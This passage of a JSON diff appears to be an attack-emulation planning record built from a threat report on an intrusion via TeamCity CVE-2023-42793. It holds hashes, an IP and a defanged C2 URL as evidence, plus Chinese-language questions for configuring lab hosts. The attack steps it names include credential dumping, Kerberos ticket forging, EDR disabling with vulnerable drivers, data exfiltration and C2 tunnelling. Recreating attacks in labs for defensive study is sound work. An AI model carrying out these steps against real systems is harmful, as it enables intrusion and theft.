+   "quote": "19F1EF66E449CF2A2B0283DBB756850CCA396114286E1485E35E6C672C9C3641",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "123"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "19F1EF66E449CF2A2B0283DBB756850CCA396114286E1485E35E6C672C9C3641"
+  },
+  {
+   "id": "evidence-77",
+   "quote": "1E74CF0223D57FD846E171F4A58790280D4593DF1F23132044076560A5455FF8",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "123"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "1E74CF0223D57FD846E171F4A58790280D4593DF1F23132044076560A5455FF8"
+  },
+  {
+   "id": "evidence-78",
+   "quote": "219FB90D2E88A2197A9E08B0E7811E2E0BD23D59233287587CCC4642C2CF3D67",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "123"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "219FB90D2E88A2197A9E08B0E7811E2E0BD23D59233287587CCC4642C2CF3D67"
+  },
+  {
+   "id": "evidence-79",
+   "quote": "92C7693E82A90D08249EDEAFBCA6533FED81B62E9E056DEC34C24756E0A130A6",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "123"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "92C7693E82A90D08249EDEAFBCA6533FED81B62E9E056DEC34C24756E0A130A6"
+  },
+  {
+   "id": "evidence-80",
+   "quote": "B53E27C79EED8531B1E05827ACE2362603FB9F77F53CEE2E34940D570217CBF7",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "123"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "B53E27C79EED8531B1E05827ACE2362603FB9F77F53CEE2E34940D570217CBF7"
+  },
+  {
+   "id": "evidence-81",
+   "quote": "C37C109171F32456BBE57B8676CC533091E387E6BA733FBAA01175C43CFB6EBD",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "123"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "C37C109171F32456BBE57B8676CC533091E387E6BA733FBAA01175C43CFB6EBD"
+  },
+  {
+   "id": "evidence-82",
+   "quote": "C40A8006A7B1F10B1B42FDD8D6D0F434BE503FB3400FB948AC9AB8DDFA5B78A0",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "123"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "C40A8006A7B1F10B1B42FDD8D6D0F434BE503FB3400FB948AC9AB8DDFA5B78A0"
+  },
+  {
+   "id": "evidence-83",
+   "quote": "C832462C15C8041191F190F7A88D25089D57F78E97161C3003D68D0CC2C4BAA3",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "123"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "C832462C15C8041191F190F7A88D25089D57F78E97161C3003D68D0CC2C4BAA3"
+  },
+  {
+   "id": "evidence-84",
+   "quote": "F6194121E1540C3553273709127DFA1DAAB96B0ACFAB6E92548BFB4059913C69",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "123"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "F6194121E1540C3553273709127DFA1DAAB96B0ACFAB6E92548BFB4059913C69"
+  },
+  {
+   "id": "evidence-85",
+   "quote": "D724728344FCF3812A0664A80270F7B4980B82342449A8C5A2FA510E10600443",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "124"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "D724728344FCF3812A0664A80270F7B4980B82342449A8C5A2FA510E10600443"
+  },
+  {
+   "id": "evidence-86",
+   "quote": "4EE70128C70D646C5C2A9A17AD05949CB1FBF1043E9D671998812B2DCE75CF0F",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "125"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "4EE70128C70D646C5C2A9A17AD05949CB1FBF1043E9D671998812B2DCE75CF0F"
+  },
+  {
+   "id": "evidence-87",
+   "quote": "950ADBAF66AB214DE837E6F1C00921C501746616A882EA8C42F1BAD5F9B6EFF4",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "126"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "950ADBAF66AB214DE837E6F1C00921C501746616A882EA8C42F1BAD5F9B6EFF4"
+  },
+  {
+   "id": "evidence-88",
+   "quote": "103.76.128.34",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "131"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "103.76.128.34"
+  },
+  {
+   "id": "evidence-89",
+   "quote": "HXXPS://MATCLICK[.]COM/WP-QUERY[.]PHP",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "132"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "HXXPS://MATCLICK[.]COM/WP QUERY[.]PHP"
+  },
+  {
+   "id": "evidence-90",
+   "quote": "MATCLICK[.]COM",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "132"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "MATCLICK[.]COM"
+  },
+  {
+   "id": "evidence-91",
+   "quote": "WP-QUERY[.]PHP",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "132"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "WP QUERY[.]PHP"
+  },
+  {
+   "id": "evidence-92",
+   "quote": "powershell Get-WmiObject -Class Win32_Service -Computername ▪",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "10"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "powershell Get WmiObject Class Win32_Service Computername ▪"
+  },
+  {
+   "id": "evidence-93",
+   "quote": "powershell Get-WindowsDriver -Online -All",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "10"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "powershell Get WindowsDriver Online All"
+  },
+  {
+   "id": "evidence-94",
+   "quote": "powershell Get-WindowsDriver -Online -All",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "44"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "powershell Get WindowsDriver Online All"
+  },
+  {
+   "id": "evidence-95",
+   "quote": "powershell Get-WmiObject -Class Win32_Service -Computername •",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "44"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "powershell Get WmiObject Class Win32_Service Computername •"
+  }
+ ],
+ "missing_items": [
+  {
+   "id": "missing-hosts-h1-os",
+   "field": "JetBrains TeamCity server — 作業系統",
+   "category": "host",
+   "reason": "來源未提供這台主機/資產的作業系統；不能由產品或角色直接推定。",
+   "severity": "major",
+   "status": "open",
+   "question": "JetBrains TeamCity server 實際使用哪個作業系統？原文只提供主機/資產線索，請填實際系統或標記未知。",
+   "affects": [
+    "hosts:h1 — JetBrains TeamCity server",
+    "action:a1 — Exploit JetBrains TeamCity CVE-2023-42793 for initial access",
+    "action:a2 — Execute arbitrary code with high privileges on TeamCity server",
+    "action:a3 — Perform host reconnaissance using built-in commands",
+    "action:a9 — Perform privilege escalation using WinPEAS, NoLmHash registry modification, and Mimikatz",
+    "action:a10 — Establish persistence using scheduled tasks",
+    "action:a11 — Craft Ticket Granting Tickets (TGTs) using Rubeus toolkit",
+    "action:a12 — Exfiltrate Windows Registry hives",
+    "action:a13 — Use SharpChromium tool to obtain sensitive browser data",
+    "action:a14 — Perform network reconnaissance using built-in commands and PowerSploit",
+    "action:a15 — Establish tunnel to C2 infrastructure using modified Rsockstun tool (rr.exe)",
+    "action:a16 — Perform lateral movement using WMIC and registry modification",
+    "action:a17 — Use GraphicalProton backdoor for C2 communication",
+    "action:a18 — Use GraphicalProton HTTPS variant for C2 communication"
+   ],
+   "suggestions": [
+    "Windows Server 2019（候選；請核對原文或資產清單）",
+    "Windows Server 2016（候選；請核對原文或資產清單）",
+    "Windows Server 2022（候選；請核對原文或資產清單）",
+    "其他 Windows 版本（請填確切版本）",
+    "其他作業系統（請填確切名稱）"
+   ],
+   "known": [
+    {
+     "field": "host role or asset",
+     "value": "JetBrains TeamCity server",
+     "source_ref": "hosts:h1.role",
+     "epistemic_status": "insufficient",
+     "evidence_refs": [
+      "evidence-36",
+      "evidence-37",
+      "evidence-38",
+      "evidence-1",
+      "evidence-2",
+      "evidence-3",
+      "evidence-9",
+      "evidence-10",
+      "evidence-11",
+      "evidence-12",
+      "evidence-13",
+      "evidence-14",
+      "evidence-15",
+      "evidence-16",
+      "evidence-17",
+      "evidence-18",
+      "evidence-19",
+      "evidence-20",
+      "evidence-21"
+     ]
+    },
+    {
+     "field": "作業系統",
+     "value": "Windows",
+     "source_ref": "hosts:h1.os",
+     "epistemic_status": "insufficient",
+     "evidence_refs": [
+      "evidence-36",
+      "evidence-37",
+      "evidence-38",
+      "evidence-1",
+      "evidence-2",
+      "evidence-3",
+      "evidence-9",
+      "evidence-10",
+      "evidence-11",
+      "evidence-12",
+      "evidence-13",
+      "evidence-14",
+      "evidence-15",
+      "evidence-16",
+      "evidence-17",
+      "evidence-18",
+      "evidence-19",
+      "evidence-20",
+      "evidence-21"
+     ]
+    }
+   ],
+   "needs_user_decision": true,
+   "examples": [
+    "Windows Server 2019（候選；請核對原文或資產清單）",
+    "Windows Server 2016（候選；請核對原文或資產清單）",
+    "Windows Server 2022（候選；請核對原文或資產清單）"
+   ],
+   "target": {
+    "collection": "hosts",
+    "id": "h1",
+    "field": "os"
+   }
+  },
+  {
+   "id": "missing-hosts-h1-os-version",
+   "field": "JetBrains TeamCity server — 作業系統版本",
+   "category": "version",
+   "reason": "來源未提供這台主機/資產的確切 OS 版本或 build。",
+   "severity": "major",
+   "status": "open",
+   "question": "JetBrains TeamCity server 的作業系統確切版本/build 是什麼？若無法確認，請明確保留未知。",
+   "affects": [
+    "hosts:h1 — JetBrains TeamCity server",
+    "action:a1 — Exploit JetBrains TeamCity CVE-2023-42793 for initial access",
+    "action:a2 — Execute arbitrary code with high privileges on TeamCity server",
+    "action:a3 — Perform host reconnaissance using built-in commands",
+    "action:a9 — Perform privilege escalation using WinPEAS, NoLmHash registry modification, and Mimikatz",
+    "action:a10 — Establish persistence using scheduled tasks",
+    "action:a11 — Craft Ticket Granting Tickets (TGTs) using Rubeus toolkit",
+    "action:a12 — Exfiltrate Windows Registry hives",
+    "action:a13 — Use SharpChromium tool to obtain sensitive browser data",
+    "action:a14 — Perform network reconnaissance using built-in commands and PowerSploit",
+    "action:a15 — Establish tunnel to C2 infrastructure using modified Rsockstun tool (rr.exe)",
+    "action:a16 — Perform lateral movement using WMIC and registry modification",
+    "action:a17 — Use GraphicalProton backdoor for C2 communication",
+    "action:a18 — Use GraphicalProton HTTPS variant for C2 communication"
+   ],
+   "suggestions": [
+    "Windows Server 2019（確切 build 待確認）",
+    "Windows Server 2016（確切 build 待確認）",
+    "Windows Server 2022（確切 build 待確認）"
+   ],
+   "known": [
+    {
+     "field": "host role or asset",
+     "value": "JetBrains TeamCity server",
+     "source_ref": "hosts:h1.role",
+     "epistemic_status": "insufficient",
+     "evidence_refs": [
+      "evidence-36",
+      "evidence-37",
+      "evidence-38",
+      "evidence-1",
+      "evidence-2",
+      "evidence-3",
+      "evidence-9",
+      "evidence-10",
+      "evidence-11",
+      "evidence-12",
+      "evidence-13",
+      "evidence-14",
+      "evidence-15",
+      "evidence-16",
+      "evidence-17",
+      "evidence-18",
+      "evidence-19",
+      "evidence-20",
+      "evidence-21"
+     ]
+    }
+   ],
+   "needs_user_decision": true,
+   "target": {
+    "collection": "hosts",
+    "id": "h1",
+    "field": "os_version"
+   }
+  },
+  {
+   "id": "missing-hosts-h1-network",
+   "field": "JetBrains TeamCity server — 網段/網路位置",
+   "category": "network",
+   "reason": "IR 有主機或資產線索，但沒有可部署的網段與可達性設定。",
+   "severity": "major",
+   "status": "open",
+   "question": "JetBrains TeamCity server 要放在哪個網段？請指出隔離/內網/DMZ 等位置，以及哪些來源可以連到它。",
+   "affects": [
+    "hosts:h1 — JetBrains TeamCity server",
+    "action:a1 — Exploit JetBrains TeamCity CVE-2023-42793 for initial access",
+    "action:a2 — Execute arbitrary code with high privileges on TeamCity server",
+    "action:a3 — Perform host reconnaissance using built-in commands",
+    "action:a9 — Perform privilege escalation using WinPEAS, NoLmHash registry modification, and Mimikatz",
+    "action:a10 — Establish persistence using scheduled tasks",
+    "action:a11 — Craft Ticket Granting Tickets (TGTs) using Rubeus toolkit",
+    "action:a12 — Exfiltrate Windows Registry hives",
+    "action:a13 — Use SharpChromium tool to obtain sensitive browser data",
+    "action:a14 — Perform network reconnaissance using built-in commands and PowerSploit",
+    "action:a15 — Establish tunnel to C2 infrastructure using modified Rsockstun tool (rr.exe)",
+    "action:a16 — Perform lateral movement using WMIC and registry modification",
+    "action:a17 — Use GraphicalProton backdoor for C2 communication",
+    "action:a18 — Use GraphicalProton HTTPS variant for C2 communication"
+   ],
+   "suggestions": [
+    "內部／管理網段（候選；請確認允許來源）",
+    "隔離測試網段（只連必要主機）",
+    "其他網段（請描述區域與可達路徑）"
+   ],
+   "known": [
+    {
+     "field": "host role or asset",
+     "value": "JetBrains TeamCity server",
+     "source_ref": "hosts:h1.role",
+     "epistemic_status": "insufficient",
+     "evidence_refs": [
+      "evidence-36",
+      "evidence-37",
+      "evidence-38",
+      "evidence-1",
+      "evidence-2",
+      "evidence-3",
+      "evidence-9",
+      "evidence-10",
+      "evidence-11",
+      "evidence-12",
+      "evidence-13",
+      "evidence-14",
+      "evidence-15",
+      "evidence-16",
+      "evidence-17",
+      "evidence-18",
+      "evidence-19",
+      "evidence-20",
+      "evidence-21"
+     ]
+    }
+   ],
+   "needs_user_decision": true,
+   "target": {
+    "collection": "hosts",
+    "id": "h1",
+    "field": "network_placement"
+   }
+  },
+  {
+   "id": "missing-hosts-h2-os",
+   "field": "Compromised hosts with Microsoft SQL Server — 作業系統",
+   "category": "host",
+   "reason": "來源未提供這台主機/資產的作業系統；不能由產品或角色直接推定。",
+   "severity": "major",
+   "status": "open",
+   "question": "Compromised hosts with Microsoft SQL Server 實際使用哪個作業系統？原文只提供主機/資產線索，請填實際系統或標記未知。",
+   "affects": [
+    "hosts:h2 — Compromised hosts with Microsoft SQL Server",
+    "action:a4 — Exfiltrate files from compromised hosts",
+    "action:a5 — Compress Microsoft SQL Server DLL files using PowerShell",
+    "action:a6 — Disable or kill endpoint detection and response (EDR) and antivirus (AV) software using 'Bring Your Own Vulnerable Driver' technique"
+   ],
+   "suggestions": [
+    "Windows Server 2019（候選；請核對原文或資產清單）",
+    "Windows Server 2016（候選；請核對原文或資產清單）",
+    "Windows Server 2022（候選；請核對原文或資產清單）",
+    "其他 Windows 版本（請填確切版本）",
+    "其他作業系統（請填確切名稱）"
+   ],
+   "known": [
+    {
+     "field": "host role or asset",
+     "value": "Compromised hosts with Microsoft SQL Server",
+     "source_ref": "hosts:h2.role",
+     "epistemic_status": "insufficient",
+     "evidence_refs": [
+      "evidence-39",
+      "evidence-5",
+      "evidence-4",
+      "evidence-6"
+     ]
+    },
+    {
+     "field": "作業系統",
+     "value": "Windows",
+     "source_ref": "hosts:h2.os",
+     "epistemic_status": "insufficient",
+     "evidence_refs": [
+      "evidence-39",
+      "evidence-5",
+      "evidence-4",
+      "evidence-6"
+     ]
+    }
+   ],
+   "needs_user_decision": true,
+   "examples": [
+    "Windows Server 2019（候選；請核對原文或資產清單）",
+    "Windows Server 2016（候選；請核對原文或資產清單）",
+    "Windows Server 2022（候選；請核對原文或資產清單）"
+   ],
+   "target": {
+    "collection": "hosts",
+    "id": "h2",
+    "field": "os"
+   }
+  },
+  {
+   "id": "missing-hosts-h2-os-version",
+   "field": "Compromised hosts with Microsoft SQL Server — 作業系統版本",
+   "category": "version",
+   "reason": "來源未提供這台主機/資產的確切 OS 版本或 build。",
+   "severity": "major",
+   "status": "open",
+   "question": "Compromised hosts with Microsoft SQL Server 的作業系統確切版本/build 是什麼？若無法確認，請明確保留未知。",
+   "affects": [
+    "hosts:h2 — Compromised hosts with Microsoft SQL Server",
+    "action:a4 — Exfiltrate files from compromised hosts",
+    "action:a5 — Compress Microsoft SQL Server DLL files using PowerShell",
+    "action:a6 — Disable or kill endpoint detection and response (EDR) and antivirus (AV) software using 'Bring Your Own Vulnerable Driver' technique"
+   ],
+   "suggestions": [
+    "Windows Server 2019（確切 build 待確認）",
+    "Windows Server 2016（確切 build 待確認）",
+    "Windows Server 2022（確切 build 待確認）"
+   ],
+   "known": [
+    {
+     "field": "host role or asset",
+     "value": "Compromised hosts with Microsoft SQL Server",
+     "source_ref": "hosts:h2.role",
+     "epistemic_status": "insufficient",
+     "evidence_refs": [
+      "evidence-39",
+      "evidence-5",
+      "evidence-4",
+      "evidence-6"
+     ]
+    }
+   ],
+   "needs_user_decision": true,
+   "target": {
+    "collection": "hosts",
+    "id": "h2",
+    "field": "os_version"
+   }
+  },
+  {
+   "id": "missing-hosts-h2-network",
+   "field": "Compromised hosts with Microsoft SQL Server — 網段/網路位置",
+   "category": "network",
+   "reason": "IR 有主機或資產線索，但沒有可部署的網段與可達性設定。",
+   "severity": "major",
+   "status": "open",
+   "question": "Compromised hosts with Microsoft SQL Server 要放在哪個網段？請指出隔離/內網/DMZ 等位置，以及哪些來源可以連到它。",
+   "affects": [
+    "hosts:h2 — Compromised hosts with Microsoft SQL Server",
+    "action:a4 — Exfiltrate files from compromised hosts",
+    "action:a5 — Compress Microsoft SQL Server DLL files using PowerShell",
+    "action:a6 — Disable or kill endpoint detection and response (EDR) and antivirus (AV) software using 'Bring Your Own Vulnerable Driver' technique"
+   ],
+   "suggestions": [
+    "隔離測試網段（只連必要主機）",
+    "內部網段（請描述允許來源）",
+    "對外 DMZ（只有原文/拓樸確認時才選）"
+   ],
+   "known": [
+    {
+     "field": "host role or asset",
+     "value": "Compromised hosts with Microsoft SQL Server",
+     "source_ref": "hosts:h2.role",
+     "epistemic_status": "insufficient",
+     "evidence_refs": [
+      "evidence-39",
+      "evidence-5",
+      "evidence-4",
+      "evidence-6"
+     ]
+    }
+   ],
+   "needs_user_decision": true,
+   "target": {
+    "collection": "hosts",
+    "id": "h2",
+    "field": "network_placement"
+   }
+  },
+  {
+   "id": "missing-hosts-h3-os",
+   "field": "Hosts running Zabbix software — 作業系統",
+   "category": "host",
+   "reason": "來源未提供這台主機/資產的作業系統；不能由產品或角色直接推定。",
+   "severity": "major",
+   "status": "open",
+   "question": "Hosts running Zabbix software 實際使用哪個作業系統？原文只提供主機/資產線索，請填實際系統或標記未知。",
+   "affects": [
+    "hosts:h3 — Hosts running Zabbix software"
+   ],
+   "suggestions": [
+    "Windows Server（候選；需確認）",
+    "Linux Server（候選；需確認）",
+    "其他作業系統（請填確切名稱）"
+   ],
+   "known": [
+    {
+     "field": "host role or asset",
+     "value": "Hosts running Zabbix software",
+     "source_ref": "hosts:h3.role",
+     "epistemic_status": "insufficient",
+     "evidence_refs": [
+      "evidence-40"
+     ]
+    },
+    {
+     "field": "作業系統",
+     "value": "Windows",
+     "source_ref": "hosts:h3.os",
+     "epistemic_status": "insufficient",
+     "evidence_refs": [
+      "evidence-40"
+     ]
+    }
+   ],
+   "needs_user_decision": true,
+   "examples": [
+    "Windows Server（候選；需確認）",
+    "Linux Server（候選；需確認）",
+    "其他作業系統（請填確切名稱）"
+   ],
+   "target": {
+    "collection": "hosts",
+    "id": "h3",
+    "field": "os"
+   }
+  },
+  {
+   "id": "missing-hosts-h3-os-version",
+   "field": "Hosts running Zabbix software — 作業系統版本",
+   "category": "version",
+   "reason": "來源未提供這台主機/資產的確切 OS 版本或 build。",
+   "severity": "major",
+   "status": "open",
+   "question": "Hosts running Zabbix software 的作業系統確切版本/build 是什麼？若無法確認，請明確保留未知。",
+   "affects": [
+    "hosts:h3 — Hosts running Zabbix software"
+   ],
+   "suggestions": [
+    "請填原文或資產清單中的確切作業系統版本",
+    "Windows Server（build 待確認）",
+    "Linux 發行版（版本待確認）"
+   ],
+   "known": [
+    {
+     "field": "host role or asset",
+     "value": "Hosts running Zabbix software",
+     "source_ref": "hosts:h3.role",
+     "epistemic_status": "insufficient",
+     "evidence_refs": [
+      "evidence-40"
+     ]
+    }
+   ],
+   "needs_user_decision": true,
+   "target": {
+    "collection": "hosts",
+    "id": "h3",
+    "field": "os_version"
+   }
+  },
+  {
+   "id": "missing-hosts-h3-network",
+   "field": "Hosts running Zabbix software — 網段/網路位置",
+   "category": "network",
+   "reason": "IR 有主機或資產線索，但沒有可部署的網段與可達性設定。",
+   "severity": "major",
+   "status": "open",
+   "question": "Hosts running Zabbix software 要放在哪個網段？請指出隔離/內網/DMZ 等位置，以及哪些來源可以連到它。",
+   "affects": [
+    "hosts:h3 — Hosts running Zabbix software"
+   ],
+   "suggestions": [
+    "隔離測試網段（只連必要主機）",
+    "內部網段（請描述允許來源）",
+    "對外 DMZ（只有原文/拓樸確認時才選）"
+   ],
+   "known": [
+    {
+     "field": "host role or asset",
+     "value": "Hosts running Zabbix software",
+     "source_ref": "hosts:h3.role",
+     "epistemic_status": "insufficient",
+     "evidence_refs": [
+      "evidence-40"
+     ]
+    }
+   ],
+   "needs_user_decision": true,
+   "target": {
+    "collection": "hosts",
+    "id": "h3",
+    "field": "network_placement"
+   }
+  },
+  {
+   "id": "missing-hosts-h4-os",
+   "field": "Hosts running Webroot antivirus software — 作業系統",
+   "category": "host",
+   "reason": "來源未提供這台主機/資產的作業系統；不能由產品或角色直接推定。",
+   "severity": "major",
+   "status": "open",
+   "question": "Hosts running Webroot antivirus software 實際使用哪個作業系統？原文只提供主機/資產線索，請填實際系統或標記未知。",
+   "affects": [
+    "hosts:h4 — Hosts running Webroot antivirus software"
+   ],
+   "suggestions": [
+    "Windows Server（候選；需確認）",
+    "Linux Server（候選；需確認）",
+    "其他作業系統（請填確切名稱）"
+   ],
+   "known": [
+    {
+     "field": "host role or asset",
+     "value": "Hosts running Webroot antivirus software",
+     "source_ref": "hosts:h4.role",
+     "epistemic_status": "insufficient",
+     "evidence_refs": [
+      "evidence-41"
+     ]
+    },
+    {
+     "field": "作業系統",
+     "value": "Windows",
+     "source_ref": "hosts:h4.os",
+     "epistemic_status": "insufficient",
+     "evidence_refs": [
+      "evidence-41"
+     ]
+    }
+   ],
+   "needs_user_decision": true,
+   "examples": [
+    "Windows Server（候選；需確認）",
+    "Linux Server（候選；需確認）",
+    "其他作業系統（請填確切名稱）"
+   ],
+   "target": {
+    "collection": "hosts",
+    "id": "h4",
+    "field": "os"
+   }
+  },
+  {
+   "id": "missing-hosts-h4-os-version",
+   "field": "Hosts running Webroot antivirus software — 作業系統版本",
+   "category": "version",
+   "reason": "來源未提供這台主機/資產的確切 OS 版本或 build。",
+   "severity": "major",
+   "status": "open",
+   "question": "Hosts running Webroot antivirus software 的作業系統確切版本/build 是什麼？若無法確認，請明確保留未知。",
+   "affects": [
+    "hosts:h4 — Hosts running Webroot antivirus software"
+   ],
+   "suggestions": [
+    "請填原文或資產清單中的確切作業系統版本",
+    "Windows Server（build 待確認）",
+    "Linux 發行版（版本待確認）"
+   ],
+   "known": [
+    {
+     "field": "host role or asset",
+     "value": "Hosts running Webroot antivirus software",
+     "source_ref": "hosts:h4.role",
+     "epistemic_status": "insufficient",
+     "evidence_refs": [
+      "evidence-41"
+     ]
+    }
+   ],
+   "needs_user_decision": true,
+   "target": {
+    "collection": "hosts",
+    "id": "h4",
+    "field": "os_version"
+   }
+  },
+  {
+   "id": "missing-hosts-h4-network",
+   "field": "Hosts running Webroot antivirus software — 網段/網路位置",
+   "category": "network",
+   "reason": "IR 有主機或資產線索，但沒有可部署的網段與可達性設定。",
+   "severity": "major",
+   "status": "open",
+   "question": "Hosts running Webroot antivirus software 要放在哪個網段？請指出隔離/內網/DMZ 等位置，以及哪些來源可以連到它。",
+   "affects": [
+    "hosts:h4 — Hosts running Webroot antivirus software"
+   ],
+   "suggestions": [
+    "隔離測試網段（只連必要主機）",
+    "內部網段（請描述允許來源）",
+    "對外 DMZ（只有原文/拓樸確認時才選）"
+   ],
+   "known": [
+    {
+     "field": "host role or asset",
+     "value": "Hosts running Webroot antivirus software",
+     "source_ref": "hosts:h4.role",
+     "epistemic_status": "insufficient",
+     "evidence_refs": [
+      "evidence-41"
+     ]
+    }
+   ],
+   "needs_user_decision": true,
+   "target": {
+    "collection": "hosts",
+    "id": "h4",
+    "field": "network_placement"
+   }
+  },
+  {
+   "id": "missing-hosts-h5-os",
+   "field": "Hosts running Microsoft vcperf application — 作業系統",
+   "category": "host",
+   "reason": "來源未提供這台主機/資產的作業系統；不能由產品或角色直接推定。",
+   "severity": "major",
+   "status": "open",
+   "question": "Hosts running Microsoft vcperf application 實際使用哪個作業系統？原文只提供主機/資產線索，請填實際系統或標記未知。",
+   "affects": [
+    "hosts:h5 — Hosts running Microsoft vcperf application",
+    "action:a7 — Hide backdoors via DLL hijacking and masquerading"
+   ],
+   "suggestions": [
+    "Windows Server（候選；需確認）",
+    "Linux Server（候選；需確認）",
+    "其他作業系統（請填確切名稱）"
+   ],
+   "known": [
+    {
+     "field": "host role or asset",
+     "value": "Hosts running Microsoft vcperf application",
+     "source_ref": "hosts:h5.role",
+     "epistemic_status": "insufficient",
+     "evidence_refs": [
+      "evidence-42",
+      "evidence-7"
+     ]
+    },
+    {
+     "field": "作業系統",
+     "value": "Windows",
+     "source_ref": "hosts:h5.os",
+     "epistemic_status": "insufficient",
+     "evidence_refs": [
+      "evidence-42",
+      "evidence-7"
+     ]
+    }
+   ],
+   "needs_user_decision": true,
+   "examples": [
+    "Windows Server（候選；需確認）",
+    "Linux Server（候選；需確認）",
+    "其他作業系統（請填確切名稱）"
+   ],
+   "target": {
+    "collection": "hosts",
+    "id": "h5",
+    "field": "os"
+   }
+  },
+  {
+   "id": "missing-hosts-h5-os-version",
+   "field": "Hosts running Microsoft vcperf application — 作業系統版本",
+   "category": "version",
+   "reason": "來源未提供這台主機/資產的確切 OS 版本或 build。",
+   "severity": "major",
+   "status": "open",
+   "question": "Hosts running Microsoft vcperf application 的作業系統確切版本/build 是什麼？若無法確認，請明確保留未知。",
+   "affects": [
+    "hosts:h5 — Hosts running Microsoft vcperf application",
+    "action:a7 — Hide backdoors via DLL hijacking and masquerading"
+   ],
+   "suggestions": [
+    "請填原文或資產清單中的確切作業系統版本",
+    "Windows Server（build 待確認）",
+    "Linux 發行版（版本待確認）"
+   ],
+   "known": [
+    {
+     "field": "host role or asset",
+     "value": "Hosts running Microsoft vcperf application",
+     "source_ref": "hosts:h5.role",
+     "epistemic_status": "insufficient",
+     "evidence_refs": [
+      "evidence-42",
+      "evidence-7"
+     ]
+    }
+   ],
+   "needs_user_decision": true,
+   "target": {
+    "collection": "hosts",
+    "id": "h5",
+    "field": "os_version"
+   }
+  },
+  {
+   "id": "missing-hosts-h5-network",
+   "field": "Hosts running Microsoft vcperf application — 網段/網路位置",
+   "category": "network",
+   "reason": "IR 有主機或資產線索，但沒有可部署的網段與可達性設定。",
+   "severity": "major",
+   "status": "open",
+   "question": "Hosts running Microsoft vcperf application 要放在哪個網段？請指出隔離/內網/DMZ 等位置，以及哪些來源可以連到它。",
+   "affects": [
+    "hosts:h5 — Hosts running Microsoft vcperf application",
+    "action:a7 — Hide backdoors via DLL hijacking and masquerading"
+   ],
+   "suggestions": [
+    "隔離測試網段（只連必要主機）",
+    "內部網段（請描述允許來源）",
+    "對外 DMZ（只有原文/拓樸確認時才選）"
+   ],
+   "known": [
+    {
+     "field": "host role or asset",
+     "value": "Hosts running Microsoft vcperf application",
+     "source_ref": "hosts:h5.role",
+     "epistemic_status": "insufficient",
+     "evidence_refs": [
+      "evidence-42",
+      "evidence-7"
+     ]
+    }
+   ],
+   "needs_user_decision": true,
+   "target": {
+    "collection": "hosts",
+    "id": "h5",
+    "field": "network_placement"
+   }
+  },
+  {
+   "id": "missing-product-wordpress-version",
+   "field": "WordPress version",
+   "category": "software",
+   "reason": "IR 指出 WordPress 相關步驟，但沒有可重現所需的確切版本。",
+   "severity": "major",
+   "status": "open",
+   "question": "AttackFlow 指出目標是 Corporate Blog on WordPress，但沒有版號。靶場要對應哪個 WordPress 版本？",
+   "affects": [
+    "action:a18 — Use GraphicalProton HTTPS variant for C2 communication"
+   ],
+   "suggestions": [
+    "WordPress（請由後台或部署檔確認確切版本）",
+    "無法確認；保留為未知"
+   ],
+   "known": [
+    {
+     "field": "相關步驟",
+     "value": "Use GraphicalProton HTTPS variant for C2 communication",
+     "source_ref": "actions:a18.name",
+     "epistemic_status": "supported",
+     "evidence_refs": [
+      "evidence-21"
+     ]
+    }
+   ],
+   "needs_user_decision": true
+  },
+  {
+   "id": "missing-product-mimikatz-version",
+   "field": "Mimikatz version",
+   "category": "software",
+   "reason": "IR 指出 Mimikatz 相關步驟，但沒有可重現所需的確切版本。",
+   "severity": "major",
+   "status": "open",
+   "question": "a9 提到 Mimikatz，但沒有提供可重現的版號。若靶場需要固定版本，請從來源或資產清單核對；否則選擇隔離靶場替代並標記。",
+   "affects": [
+    "action:a9 — Perform privilege escalation using WinPEAS, NoLmHash registry modification, and Mimikatz"
